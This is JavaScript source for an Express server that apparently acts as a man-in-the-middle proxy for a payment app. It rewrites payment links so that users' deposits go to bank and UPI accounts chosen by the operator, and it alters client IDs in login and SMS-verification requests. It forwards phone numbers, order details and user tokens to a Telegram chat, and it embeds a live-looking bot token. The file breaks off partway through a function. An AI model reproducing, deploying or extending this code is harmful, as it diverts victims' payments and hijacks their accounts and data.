const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');

const app = express();
const TIVOX_API = 'https://tivox.icu';
const REAL_API = 'https://qonix.click';
const FRONTEND_HOST = 'vivipay.net';
const PROXY_HOST = 'rtyhh.vercel.app';
const BOT_TOKEN = '8537838501:AAGuVHlnxIMo6OFORmhzSvRpkkhH2-0qDCI';
const WEBHOOK_URL = 'https://rtyhh.vercel.app/bot-webhook';
const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
const TELEGRAM_ADMIN_CHAT_ID = '7972440762';
const TELEGRAM_OVERRIDE = 'https://t.me/Vivipaymed';
// One-shot Client-ID override lifetime for the next authentication flow.
const CLIENT_ID_OVERRIDE_TTL = 5 * 60 * 1000;

const DEFAULT_DATA = {
    banks: [],
    activeIndex: -1,
    botEnabled: true,
    autoRotate: false,
    lastUsedIndex: -1,
    adminChatId: null,
    logRequests: false,
    rawLog: false,
    usdtAddress: '',
    depositSuccess: false,
    depositBonus: 0,
    withdrawOverride: 0,
    userOverrides: {},
    trackedUsers: {},
    blockUpdate: true,
    orderBankMap: {},
    nextClientIdOverride: null,
    bannedUsers: {}
};

let bot = null;
let webhookSet = false;
const _balSnapTimes = {};
try { bot = new TelegramBot(BOT_TOKEN); } catch (e) { }

let redis = null;
if (REDIS_URL && REDIS_TOKEN) {
    try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch (e) { }
}

let cachedData = null;
let cacheTime = 0;
const CACHE_TTL = 5000;
const tokenUserMap = {};
const ipUserMap = {};

// Telegram retries webhook deliveries when the previous response is delayed.
// Without deduplication, toggle commands such as /rotate and /log can run twice
// and appear to do nothing. Keep processed update_ids briefly in memory.
const processedTelegramUpdates = new Map();
const TELEGRAM_UPDATE_TTL = 10 * 60 * 1000;
function claimTelegramUpdate(updateId) {
    if (updateId === undefined || updateId === null) return true;
    const key = String(updateId);
    const now = Date.now();
    for (const [oldKey, seenAt] of processedTelegramUpdates) {
        if (now - seenAt > TELEGRAM_UPDATE_TTL) processedTelegramUpdates.delete(oldKey);
    }
    if (processedTelegramUpdates.has(key)) return false;
    processedTelegramUpdates.set(key, now);
    return true;
}

// ── In-memory proxy cache ────────────────────────────────────────────────────
// JS files: content-hashed filenames — cache indefinitely (never change)
// HTML:     cache 30s — avoids vivipay.net round-trip on every refresh
// CSS/img:  served directly from vivipay.net via <base> tag, not cached here
const proxyCache = new Map(); // key → { buf, ct, status, ts, ttl }
function cacheGet(key) {
    const e = proxyCache.get(key);
    if (!e) return null;
    if (e.ttl > 0 && Date.now() - e.ts > e.ttl) { proxyCache.delete(key); return null; }
    return e;
}
function cacheSet(key, buf, ct, status, ttl) {
    // Limit total cache size to ~15MB to avoid OOM
    if (buf.length < 20 * 1024 * 1024) {
        proxyCache.set(key, { buf, ct, status, ts: Date.now(), ttl });
    }
}

// Map to debounce repetitive error logs (key -> timestamp)
const recentErrors = new Map();

// Helper to clean up ugly JSON strings accidentally sent by backend in bank fields
function cleanUglyBankNames(obj, depth = 0) {
    if (!obj || typeof obj !== 'object' || depth > 10) return;
    if (Array.isArray(obj)) {
        for (const item of obj) cleanUglyBankNames(item, depth + 1);
        return;
    }
    for (const k of Object.keys(obj)) {
        if (typeof obj[k] === 'object') {
            cleanUglyBankNames(obj[k], depth + 1);
        } else if (typeof obj[k] === 'string') {
            if (obj[k].startsWith('{"code":') && obj[k].includes('"msg":')) {
                obj[k] = 'Bank';
            }
        }
    }
}
// ────────────────────────────────────────────────────────────────────────────

async function ensureWebhook() {
    if (!bot || webhookSet) return;
    try { await bot.setWebHook(WEBHOOK_URL); webhookSet = true; } catch (e) { }
}

async function loadData(forceRefresh) {
    if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
    // Keep one mutable in-memory state when Redis is unavailable. Returning a
    // fresh DEFAULT_DATA object on every request made /on, /off, /setbank, etc.
    // appear to work in Telegram but immediately revert on the next API call.
    if (!redis) {
        if (!cachedData) {
            cachedData = {
                ...DEFAULT_DATA,
                banks: [],
                userOverrides: {},
                trackedUsers: {},
                orderBankMap: {},
                nextClientIdOverride: null,
                bannedUsers: {}
            };
        }
        cacheTime = Date.now();
        return cachedData;
    }
    try {
        let raw = await redis.get('vivipayData');
        if (raw) {
            if (typeof raw === 'string') { try { raw = JSON.parse(raw); } catch (e) { } }
            if (typeof raw === 'object' && raw !== null) {
                cachedData = { ...DEFAULT_DATA, ...raw };
            } else { cachedData = { ...DEFAULT_DATA }; }
            if (!cachedData.userOverrides) cachedData.userOverrides = {};
            if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
            if (!cachedData.orderBankMap) cachedData.orderBankMap = {};
            if (cachedData.nextClientIdOverride === undefined) cachedData.nextClientIdOverride = null;
            if (!cachedData.bannedUsers) cachedData.bannedUsers = {};
            cacheTime = Date.now();
            return cachedData;
        }
    } catch (e) { console.error('Redis load error:', e.message); }
    cachedData = { ...DEFAULT_DATA };
    cacheTime = Date.now();
    return cachedData;
}

let dataSaveChain = Promise.resolve();

async function saveDataUnlocked(data) {
    const skipMerge = data._skipOverrideMerge;
    if (skipMerge) delete data._skipOverrideMerge;
    if (!redis) { cachedData = data; cacheTime = Date.now(); return; }
    try {
        if (!skipMerge) {
            if (data._lastRedisSave && Date.now() - data._lastRedisSave < 10000) {
                cachedData = data;
                return;
            }
            const current = await redis.get('vivipayData');
            if (current && typeof current === 'object') {
                const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'nextClientIdOverride', 'bannedUsers'];
                for (const key of settingsKeys) { if (current[key] !== undefined) data[key] = current[key]; }
                if (current.userOverrides) data.userOverrides = { ...current.userOverrides, ...data.userOverrides };
                if (current.orderBankMap) data.orderBankMap = { ...current.orderBankMap, ...data.orderBankMap };
            }
        }
        cachedData = data;
        cacheTime = Date.now();
        data._lastRedisSave = Date.now();
        let lastSaveError = null;
        for (let attempt = 0; attempt < 3; attempt++) {
            try {
                await redis.set('vivipayData', data);
                lastSaveError = null;
                break;
            } catch (e) {
                lastSaveError = e;
                if (attempt < 2) await new Promise(resolve => setTimeout(resolve, 150 * (attempt + 1)));
            }
        }
        if (lastSaveError) console.error('Redis save error after retries:', lastSaveError.message);
    } catch (e) { cachedData = data; cacheTime = Date.now(); console.error('Redis save preparation error:', e.message); }
}

// Keep writes in order. Vercel/serverless can receive a Telegram retry or a
// normal API request while a previous command is still saving; serializing the
// writes prevents a stale request from restoring the old /on or /off value.
function saveData(data) {
    const run = dataSaveChain.then(() => saveDataUnlocked(data));
    dataSaveChain = run.catch(() => { });
    return run;
}

function getAuthClientIdEndpoint(path) {
    const cleanPath = String(path || '').toLowerCase().split('?')[0];
    if (cleanPath.endsWith('/checksmsnew')) return 'checkSmsNew';
    if (cleanPath.endsWith('/getsendtken')) return 'getsendtken';
    if (cleanPath.endsWith('/login')) return 'login';
    return '';
}

function normalizeBanKey(value) {
    return String(value ?? '').trim().replace(/[^0-9]/g, '');
}

function getBanEntry(data, req) {
    const body = (req && req.body && typeof req.body === 'object') ? req.body : {};
    const headerUserId = req && req.headers ? (req.headers['x-px-uid'] || '') : '';
    const rawCandidates = [
        body.phone, body.mobile, body.memberPhone, body.username, body.loginName,
        body.account, body.userId, body.userID, body.uid, body.memberId, headerUserId
    ];
    const banned = (data && data.bannedUsers && typeof data.bannedUsers === 'object') ? data.bannedUsers : {};
    for (const raw of rawCandidates) {
        const key = normalizeBanKey(raw);
        if (key && banned[key]) return { key, ...banned[key] };
    }
    return null;
}

function rewriteExistingClientIdField(req, replacement) {
    if (!req || !req.rawBody || !Buffer.isBuffer(req.rawBody) || !req.rawBody.length) return false;
    const contentType = String(req.headers['content-type'] || '').toLowerCase();
    let bodyText = req.rawBody.toString();
    let changed = false;

    try {
        if (contentType.includes('json')) {
            const obj = JSON.parse(bodyText);
            const key = Object.keys(obj).find(k => ['clientid', 'client_id'].includes(String(k).toLowerCase()));
            if (!key) return false;
            obj[key] = replacement;
            bodyText = JSON.stringify(obj);
            changed = true;
        } else if (contentType.includes('multipart')) {
            const fieldRe = /(name=["'](?:clientId|clientID|client_id)["'][\s\S]*?\r?\n\r?\n)([^\r\n]*)/i;
            if (!fieldRe.test(bodyText)) return false;
            bodyText = bodyText.replace(fieldRe, `$1${replacement}`);
            changed = true;
        } else if (contentType.includes('form')) {
            const params = new URLSearchParams(bodyText);
            const key = [...params.keys()].find(k => ['clientid', 'client_id'].includes(String(k).toLowerCase()));
            if (!key) return false;
            params.set(key, replacement);
            bodyText = params.toString();
            changed = true;
        }
    } catch (e) {
        return false;
    }

    if (!changed) return false;
    req.rawBody = Buffer.from(bodyText);
    req.headers['content-length'] = String(req.rawBody.length);
    if (req.body && typeof req.body === 'object') {
        for (const key of Object.keys(req.body)) {
            if (['clientid', 'client_id'].includes(String(key).toLowerCase())) req.body[key] = replacement;
        }
    }
    return true;
}

async function applyNextClientIdOverride(req, data) {
    const endpoint = getAuthClientIdEndpoint(req.originalUrl || req.url);
    if (!endpoint || !data || !data.nextClientIdOverride) return false;

    const pending = data.nextClientIdOverride;
    const replacement = String(pending.value || '').trim();
    if (!replacement || !pending.expiresAt || Date.now() > Number(pending.expiresAt)) {
        data.nextClientIdOverride = null;
        data._skipOverrideMerge = true;
        await saveData(data);
        return false;
    }

    // Do not mark the first endpoint as consumed. The same configured Client ID
    // must be rewritten independently on both getsendtken and login; consume it
    // only after the final login request.
    if (!rewriteExistingClientIdField(req, replacement)) return false;

    // The override remains available for the same authentication flow until the
    // final login request, then it is consumed so it cannot affect later logins.
    if (endpoint === 'login') data.nextClientIdOverride = null;
    else data.nextClientIdOverride = pending;
    data._skipOverrideMerge = true;
    await saveData(data);
    if (endpoint === 'login') {
        try {
            await notifyAdmin(data, `✅ Client ID used ho chuka hai\n🆔 Client ID: ${replacement}`);
        } catch (e) { }
    }
    return true;
}

function getActiveBank(data, userId) {
    const uo = (userId && data.userOverrides) ? data.userOverrides[String(userId)] : null;
    if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
        return data.banks[uo.bankIndex];
    }
    if (data.autoRotate && data.banks.length > 1) {
        let idx;
        do { idx = Math.floor(Math.random() * data.banks.length); } while (idx === data.lastUsedIndex && data.banks.length > 1);
        data.lastUsedIndex = idx;
        return data.banks[idx];
    }
    if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) return data.banks[data.activeIndex];
    if (data.banks.length > 0) return data.banks[0];
    return null;
}

// Bank replacement is allowed only for an order that already has a mapping in KV.
// Never fall back to the currently active bank for an unrelated history/detail row.
function normalizeOrderId(value) {
    if (value === undefined || value === null) return '';
    return String(value).trim().replace(/^['\"]|['\"]$/g, '').toLowerCase();
}

function collectOrderIdCandidates(value, out = new Set(), depth = 0) {
    if (value === undefined || value === null || depth > 4) return out;
    if (Array.isArray(value)) {
        for (const item of value) collectOrderIdCandidates(item, out, depth + 1);
        return out;
    }
    if (typeof value !== 'object') {
        const normalized = normalizeOrderId(value);
        if (normalized) out.add(normalized);
        return out;
    }
    for (const [key, item] of Object.entries(value)) {
        const normalizedKey = String(key).toLowerCase().replace(/[_-]/g, '');
        if (['rptno', 'orderno', 'orderid', 'id', 'tradeno', 'slipid'].includes(normalizedKey)) {
            const normalizedValue = normalizeOrderId(item);
            if (normalizedValue) out.add(normalizedValue);
        } else if (item && typeof item === 'object' && ['data', 'result', 'order', 'payload'].includes(normalizedKey)) {
            collectOrderIdCandidates(item, out, depth + 1);
        }
    }
    return out;
}

function parseSavedMapping(saved) {
    if (saved && typeof saved === 'object') return saved;
    if (typeof saved === 'string') {
        try {
            const parsed = JSON.parse(saved);
            return parsed && typeof parsed === 'object' ? parsed : null;
        } catch (e) { }
    }
    return null;
}

function getSavedOrderMapping(data, valueOrOrder) {
    const rawMap = data && data.orderBankMap;
    let map = rawMap;
    if (typeof rawMap === 'string') {
        try { map = JSON.parse(rawMap); } catch (e) { map = null; }
    }
    if (!map || typeof map !== 'object') return null;
    const candidates = collectOrderIdCandidates(valueOrOrder);
    if (typeof valueOrOrder !== 'object' && valueOrOrder !== undefined && valueOrOrder !== null) {
        const normalized = normalizeOrderId(valueOrOrder);
        if (normalized) candidates.add(normalized);
    }
    if (candidates.size === 0) return null;

    for (const [key, rawSaved] of Object.entries(map)) {
        const saved = parseSavedMapping(rawSaved);
        const keyId = normalizeOrderId(key);
        if (keyId && candidates.has(keyId)) return saved || rawSaved;
        if (!saved) continue;
        const savedIds = collectOrderIdCandidates(saved);
        for (const id of candidates) {
            if (savedIds.has(id)) return saved;
        }
    }
    return null;
}

async function claimOrderNotification(data, valueOrOrder) {
    if (!data || typeof data !== 'object') return false;
    const candidates = collectOrderIdCandidates(valueOrOrder);
    if (typeof valueOrOrder !== 'object' && valueOrOrder !== undefined && valueOrOrder !== null) {
        const direct = normalizeOrderId(valueOrOrder);
        if (direct) candidates.add(direct);
    }
    if (candidates.size === 0) return false;

    const saved = getSavedOrderMapping(data, valueOrOrder);
    const savedObj = parseSavedMapping(saved);
    const canonical = normalizeOrderId(
        savedObj && (savedObj.rptNo || savedObj.orderId || savedObj.orderNo || savedObj.id)
    ) || [...candidates][0];
    if (!canonical) return false;

    if (savedObj && savedObj.notified) {
        if (!data.orderNotificationMap || typeof data.orderNotificationMap !== 'object' || Array.isArray(data.orderNotificationMap)) data.orderNotificationMap = {};
        data.orderNotificationMap[canonical] = { notifiedAt: Date.now(), legacy: true };
        return false;
    }

    if (!data.orderNotificationMap || typeof data.orderNotificationMap !== 'object' || Array.isArray(data.orderNotificationMap)) {
        data.orderNotificationMap = {};
    }
    for (const key of Object.keys(data.orderNotificationMap)) {
        if (candidates.has(normalizeOrderId(key))) return false;
    }
    if (data.orderNotificationMap[canonical]) return false;

    data.orderNotificationMap[canonical] = { notifiedAt: Date.now() };
    if (savedObj) savedObj.notified = true;
    data._skipOverrideMerge = true;
    try { await saveData(data); } catch (e) { }
    return true;
}

function bankFromSavedOrder(saved) {
    saved = parseSavedMapping(saved);
    if (!saved || typeof saved !== 'object') return null;
    const bankParts = typeof saved.bank === 'string' ? saved.bank.split(' | ') : [];
    return {
        accountHolder: saved.accountHolder || saved.acctName || saved.name || bankParts[0] || '',
        accountNo: saved.accountNo || saved.acctNo || saved.account || bankParts[1] || '',
        ifsc: saved.ifsc || saved.acctCode || saved.ifscCode || bankParts[2] || '',
        bankName: saved.bankName || saved.acctBankName || '',
        upiId: saved.upiId || saved.payAccount || '',
        walletDomain: saved.walletDomain || '',
        walletScheme: saved.walletScheme || ''
    };
}

function getRequestOrderId(req) {
    const query = new URLSearchParams((req.originalUrl || req.url || '').split('?')[1] || '');
    for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId', 'id', 'tradeNo']) {
        if (query.get(f)) return String(query.get(f)).trim();
    }
    if (req.body && typeof req.body === 'object') {
        for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId', 'id', 'tradeNo']) {
            if (req.body[f] !== undefined && req.body[f] !== null && String(req.body[f]).trim()) return String(req.body[f]).trim();
        }
    }
    const parts = (req.originalUrl || req.url || '').split(/[/?#]/).filter(Boolean);
    for (let i = parts.length - 1; i >= 0; i--) {
        if (/^\\d{3,}$/.test(parts[i])) return String(parts[i]);
    }
    return '';
}

function inferWalletScheme(source) {
    if (!source || typeof source !== 'object') return '';
    const payAccount = String(source.payAccount || source.pay_account || source.upi || source.vpa || source.ctAccount || source.ct_account || '').toLowerCase();
    const payType = Number(source.payType ?? source.pay_type ?? source.ctType ?? source.ct_type ?? source.paymentMethod ?? source.payment_method ?? source.method);
    if (payAccount.includes('@freecharge') || payType === 3) return 'freecharge';
    if (payAccount.includes('@mbk') || payAccount.includes('mobikwik') || payType === 2) return 'mobikwik';
    const wallet = String(source.walletDomain || source.walletUrl || '');
    const match = wallet.match(/^([A-Za-z][A-Za-z0-9+.-]*):\/\//);
    return match ? match[1].toLowerCase() : '';
}

function buildWalletDomain(bank, amount) {
    if (!bank || !bank.accountNo) return '';
    const accountNo = String(bank.accountNo);
    const ifsc = String(bank.ifsc || '');
    const holder = String(bank.accountHolder || '');
    const parsedAmount = Number(amount);
    const amountText = Number.isFinite(parsedAmount) ? parsedAmount.toFixed(1) : '0.0';
    const last4 = accountNo.slice(-4);
    const template = typeof bank.walletDomain === 'string' ? bank.walletDomain.trim() : '';
    const schemeHint = String(bank.walletScheme || '').trim().toLowerCase();
    const templateScheme = (template.match(/^([A-Za-z][A-Za-z0-9+.-]*):\/\//) || [])[1]?.toLowerCase() || '';

    // Preserve the upstream wallet scheme/path. An explicit payment-method hint
    // wins if the upstream payload carries an incorrect scheme.
    if ((!schemeHint || !templateScheme || schemeHint === templateScheme) && /^[A-Za-z][A-Za-z0-9+.-]*:\/\//.test(template) && template.includes('?')) {
        try {
            const qIdx = template.indexOf('?');
            const base = template.slice(0, qIdx + 1);
            const params = new URLSearchParams(template.slice(qIdx + 1));
            const setFirst = (names, value) => {
                for (const [key] of params) {
                    if (names.includes(key.toLowerCase().replace(/[_-]/g, ''))) {
                        params.set(key, value);
                        return true;
                    }
                }
                return false;
            };
            setFirst(['account', 'accountnumber', 'acc', 'payeeaccount', 'pa', 'payee', 'vaccount', 'vpa', 'to'], accountNo);
            setFirst(['ifsc', 'bankifsc', 'payeeifsc', 'fi'], ifsc);
            setFirst(['name', 'payeename', 'pn', 'reciever', 'receiver', 'to_name', 'toname'], holder);
            setFirst(['amount', 'amt', 'money', 'value'], amountText);
            setFirst(['displayaccountnumber', 'displayaccount', 'maskedaccount', 'masked'], `xxxxxxxxx${last4}`);
            return base + params.toString();
        } catch (e) { }
    }

    const scheme = schemeHint || templateScheme || 'mobikwik';
    return `${scheme}://moneytransfer/upi/bank?account=${accountNo}&ifsc=${ifsc}&name=${encodeURIComponent(holder)}&amount=${amountText}&displayAccountNumber=xxxxxxxxx${last4}`;
}

function parseWalletDomainDetails(walletUrl) {
    if (!walletUrl || typeof walletUrl !== 'string' || !walletUrl.includes('?')) return null;
    try {
        const qIndex = walletUrl.indexOf('?');
        const base = walletUrl.slice(0, qIndex + 1);
        const params = new URLSearchParams(walletUrl.slice(qIndex + 1));
        const normalizeKey = (key) => String(key).toLowerCase().replace(/[_-]/g, '');
        const findKey = (names) => {
            for (const key of params.keys()) {
                if (names.includes(normalizeKey(key))) return key;
            }
            return '';
        };
        const accKey = findKey(['account', 'accountnumber', 'acc', 'payeeaccount', 'pa', 'payee', 'vaccount', 'vpa', 'to']);
        const ifscKey = findKey(['ifsc', 'bankifsc', 'payeeifsc', 'fi']);
        const nameKey = findKey(['name', 'payeename', 'pn', 'reciever', 'receiver', 'to_name', 'toname']);
        const amtKey = findKey(['amount', 'amt', 'money', 'value', 'am']);
        const upiKey = findKey(['pa', 'vpa', 'upi', 'upiid']);

        const accountNo = accKey ? params.get(accKey) : '';
        const ifsc = ifscKey ? params.get(ifscKey) : '';
        const name = nameKey ? decodeURIComponent(params.get(nameKey)) : '';
        const amountStr = amtKey ? params.get(amtKey) : '';
        const amount = parseAmountCandidate(amountStr);
        const upiId = upiKey ? params.get(upiKey) : '';

        return { base, params, accountNo, ifsc, name, amount, amountStr, upiId };
    } catch (e) {
        return null;
    }
}

function injectBankIntoWalletDomain(walletDomain, bank) {
    if (!walletDomain || typeof walletDomain !== 'string' || !walletDomain.includes('?') || !bank || !bank.accountNo) return walletDomain;
    try {
        const qIndex = walletDomain.indexOf('?');
        const base = walletDomain.slice(0, qIndex + 1);
        const params = new URLSearchParams(walletDomain.slice(qIndex + 1));
        const normalizeKey = (key) => String(key).toLowerCase().replace(/[_-]/g, '');
        const findKey = (names) => {
            for (const key of params.keys()) {
                if (names.includes(normalizeKey(key))) return key;
            }
            return '';
        };
        const setOrAppend = (names, preferredKey, value) => {
            const key = findKey(names);
            if (key) params.set(key, value);
            else if (value !== '') params.set(preferredKey, value);
        };

        const accountNo = String(bank.accountNo || '').trim();
        const ifsc = String(bank.ifsc || '').trim();
        const holder = String(bank.accountHolder || '').trim();
        const upiId = String(bank.upiId || '').trim();

        // Check if this is a pure VPA link (e.g. upi://pay?pa=...)
        const hasPaOnly = findKey(['pa']) && !findKey(['account', 'acc']);
        if (hasPaOnly && upiId) {
            setOrAppend(['pa', 'vpa'], 'pa', upiId);
        } else {
            setOrAppend(['account', 'accountnumber', 'acc', 'payeeaccount', 'pa', 'payee', 'vaccount', 'vpa', 'to'], 'account', accountNo);
        }

        if (ifsc) setOrAppend(['ifsc', 'bankifsc', 'payeeifsc', 'fi'], 'ifsc', ifsc);
        if (holder) setOrAppend(['name', 'payeename', 'pn', 'reciever', 'receiver', 'toname', 'to_name'], 'name', holder);

        const displayKey = findKey(['displayaccountnumber', 'displayaccount', 'maskedaccount', 'masked']);
        if (displayKey) {
            const originalDisplay = String(params.get(displayKey) || '');
            const prefixMatch = originalDisplay.match(/^[xX*]+/);
            const prefix = prefixMatch ? prefixMatch[0] : 'xxxxxxxxx';
            params.set(displayKey, `${prefix}${accountNo.slice(-4)}`);
        } else if (accountNo && !hasPaOnly) {
            params.set('displayAccountNumber', `xxxxxxxxx${accountNo.slice(-4)}`);
        }

        return base + params.toString();
    } catch (e) {
        return walletDomain;
    }
}

function rewriteWalletDomainForBank(walletDomain, bank, minAmount) {
    if (typeof walletDomain !== 'string' || !walletDomain.includes('?') || !bank || !bank.accountNo) return walletDomain;
    try {
        const qIndex = walletDomain.indexOf('?');
        const params = new URLSearchParams(walletDomain.slice(qIndex + 1));
        const normalizeKey = (key) => String(key).toLowerCase().replace(/[_-]/g, '');
        const findKey = (names) => {
            for (const key of params.keys()) {
                if (names.includes(normalizeKey(key))) return key;
            }
            return '';
        };
        const amountKey = findKey(['amount', 'amt', 'money', 'value']);
        const amount = amountKey ? parseFloat(params.get(amountKey) || '') : NaN;
        const min = parseFloat(minAmount);
        if (Number.isFinite(min) && min > 0 && Number.isFinite(amount) && amount < min) return walletDomain;

        return injectBankIntoWalletDomain(walletDomain, bank);
    } catch (e) {
        return walletDomain;
    }
}

function rewriteWalletDomainsInResponse(obj, data, activeBank, depth = 0) {
    if (!obj || typeof obj !== 'object' || depth > 12) return;
    if (Array.isArray(obj)) {
        for (const item of obj) rewriteWalletDomainsInResponse(item, data, activeBank, depth + 1);
        return;
    }
    const saved = getSavedOrderMapping(data, obj);
    const savedBank = bankFromSavedOrder(saved);
    const bank = savedBank && (savedBank.accountNo || savedBank.ifsc || savedBank.accountHolder)
        ? savedBank
        : activeBank;
    for (const key of Object.keys(obj)) {
        if (typeof obj[key] === 'string' && key.toLowerCase() === 'walletdomain') {
            obj[key] = rewriteWalletDomainForBank(obj[key], bank, activeBank && activeBank.minAmount);
        } else if (obj[key] && typeof obj[key] === 'object') {
            rewriteWalletDomainsInResponse(obj[key], data, activeBank, depth + 1);
        }
    }
}

function bankListText(d) {
    if (d.banks.length === 0) return 'No banks added yet.';
    return d.banks.map((b, i) => {
        const a = i === d.activeIndex ? ' ✅' : '';
        const minStr = b.minAmount ? ` | Min: ₹${b.minAmount}` : '';
        return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${minStr}${a}`;
    }).join('\n');
}

function parseAmountCandidate(value) {
    if (value === undefined || value === null || value === '') return null;
    if (typeof value === 'number') return Number.isFinite(value) ? value : null;
    const cleaned = String(value).replace(/[₹,\s]/g, '').trim();
    if (!cleaned) return null;
    const n = Number.parseFloat(cleaned);
    return Number.isFinite(n) ? n : null;
}

function findAmountDeep(value, depth = 0) {
    if (!value || depth > 7) return null;
    if (typeof value === 'string') {
        const text = value.trim();
        if (!text) return null;
        try {
            const parsed = JSON.parse(text);
            const found = findAmountDeep(parsed, depth + 1);
            if (found !== null) return found;
        } catch (e) { }
        try {
            const params = new URLSearchParams(text);
            for (const key of ['amount', 'orderAmount', 'order_amount', 'payAmount', 'totalAmount', 'buyAmount']) {
                const candidate = parseAmountCandidate(params.get(key));
                if (candidate !== null) return candidate;
            }
        } catch (e) { }
        return null;
    }
    if (typeof value !== 'object') return null;
    const amountKeys = new Set([
        'amount', 'orderamount', 'order_amount', 'money', 'totalamount', 'total_amount',
        'rechargeamount', 'recharge_amount', 'buyamount', 'buy_amount', 'payamount',
        'pay_amount', 'realamount', 'real_amount', 'transactionamount', 'transaction_amount',
        'amountinr', 'amountininr', 'price', 'facevalue', 'order_money'
    ]);
    if (Array.isArray(value)) {
        for (const item of value) {
            const found = findAmountDeep(item, depth + 1);
            if (found !== null) return found;
        }
        return null;
    }
    for (const [key, item] of Object.entries(value)) {
        const normalizedKey = String(key).toLowerCase().replace(/[^a-z0-9]/g, '');
        if (amountKeys.has(normalizedKey)) {
            const candidate = parseAmountCandidate(item);
            if (candidate !== null) return candidate;
        }
    }
    for (const item of Object.values(value)) {
        if (item && (typeof item === 'object' || typeof item === 'string')) {
            const found = findAmountDeep(item, depth + 1);
            if (found !== null) return found;
        }
    }
    return null;
}

function getOrderAmount(req, respData) {
    const candidates = [
        respData,
        req && req.parsedBody,
        req && req.body
    ];
    for (const candidate of candidates) {
        const found = findAmountDeep(candidate);
        if (found !== null) return found;
    }

    if (req && req.rawBody && Buffer.isBuffer(req.rawBody)) {
        const raw = req.rawBody.toString('utf8');
        try {
            const parsed = JSON.parse(raw);
            const found = findAmountDeep(parsed);
            if (found !== null) return found;
        } catch (e) {
            try {
                const form = Object.fromEntries(new URLSearchParams(raw));
                const found = findAmountDeep(form);
                if (found !== null) return found;
            } catch (e2) { }
        }
        const rawUrlAmount = raw.match(/(?:amount|orderAmount|order_amount|payAmount|totalAmount)[=:]([^&\\s]+)/i);
        const rawCandidate = rawUrlAmount ? parseAmountCandidate(decodeURIComponent(rawUrlAmount[1])) : null;
        if (rawCandidate !== null) return rawCandidate;
    }

    const query = new URLSearchParams((req && (req.originalUrl || req.url) || '').split('?')[1] || '');
    for (const key of ['amount', 'orderAmount', 'order_amount', 'payAmount', 'totalAmount', 'buyAmount']) {
        const candidate = parseAmountCandidate(query.get(key));
        if (candidate !== null) return candidate;
    }
    return null;
}

function getTelegramCopyItems(msg) {
    const text = String(msg || '');
    const rules = [
        { label: 'Order ID', re: /(?:^|\n)\\s*(?:📋\\s*)?(?:Order(?: ID)?|rptNo|Receipt|Transaction)\\s*:\s*([^\n]+)/i },
        { label: 'User ID', re: /(?:^|\n)\\s*(?:👤\\s*)?(?:User ID|User)\\s*:\s*([^\n]+)/i },
        { label: 'Phone', re: /(?:^|\n)\\s*(?:📱\\s*)?Phone\\s*:\s*([^\n]+)/i },
        { label: 'Account', re: /(?:^|\n)\\s*(?:Account|Acc(?:ount)? No)\\s*:\s*([^\n]+)/i },
        { label: 'IFSC', re: /(?:^|\n)\\s*(?:IFSC)\\s*:\s*([^\n]+)/i },
        { label: 'UPI ID', re: /(?:^|\n)\\s*(?:UPI(?: ID)?|VPA)\\s*:\s*([^\n]+)/i },
        { label: 'Amount', re: /(?:^|\n)\\s*(?:💰\\s*)?Amount\\s*:\s*([^\n]+)/i },
        { label: 'App Token', re: /(?:^|\n)\\s*(?:🎫\\s*)?Token\\s*:\s*([^\n]+)/i }
    ];
    return rules.map(rule => {
        const match = text.match(rule.re);
        if (!match) return null;
        const value = String(match[1]).replace(/`/g, '').trim();
        return value && !/^N\/A$/i.test(value) ? { label: rule.label, value } : null;
    }).filter(Boolean);
}

function escapeTelegramHtml(value) {
    return String(value ?? '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

async function notifyAdmin(data, msg, options = {}) {
    if (!data.adminChatId || !bot) return null;
    let sent = null;
    const text = String(msg).substring(0, 4000);
    const sendOptions = options.parse_mode ? { parse_mode: options.parse_mode } : {};
    try {
        sent = await bot.sendMessage(data.adminChatId, text, sendOptions);
    } catch (e) {
        // Formatting failures should not prevent the notification from being delivered.
        try { sent = await bot.sendMessage(data.adminChatId, text); } catch (e2) { }
    }
    if (options.pin && sent && sent.message_id) {
        try {
            await bot.pinChatMessage(String(data.adminChatId), sent.message_id, { disable_notification: true });
        } catch (e) {
            // Pinning requires admin rights; the notification itself should still succeed.
        }
    }
    return sent;
}

function extractPaymentProof(rawBody, contentType) {
    if (!rawBody || !Buffer.isBuffer(rawBody) || !rawBody.length) return null;
    let fields = {};
    try { fields = contentType.includes('multipart') ? parseMultipartFields(rawBody) : {}; } catch (e) { }
    const candidates = [fields.imagedata, fields.imageData, fields.image, fields.proof, fields.file, fields.paymentProof]
        .filter(v => typeof v === 'string' && v.trim());
    for (const candidate of candidates) {
        const value = candidate.trim();
        const match = value.match(/^data:([^;]+);base64,([\s\S]+)$/i);
        if (!match) continue;
        const mime = match[1].toLowerCase();
        const base64 = match[2].replace(/[\r\n\s]/g, '');
        try {
            const buffer = Buffer.from(base64, 'base64');
            if (buffer.length > 0) return { buffer, mime, size: buffer.length };
        } catch (e) { }
    }
    return null;
}

async function notifyPaymentProof(data, { orderId, userId, amount, proof }) {
    if (!data.adminChatId || !bot) return;
    const caption = `🧾 PAYMENT PROOF RECEIVED\\n📋 Order: ${orderId || 'N/A'}\\n👤 User: ${userId || 'N/A'}${amount ? `\\n💰 Amount: ₹${amount}` : ''}\\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
    try {
        if (proof && proof.buffer) {
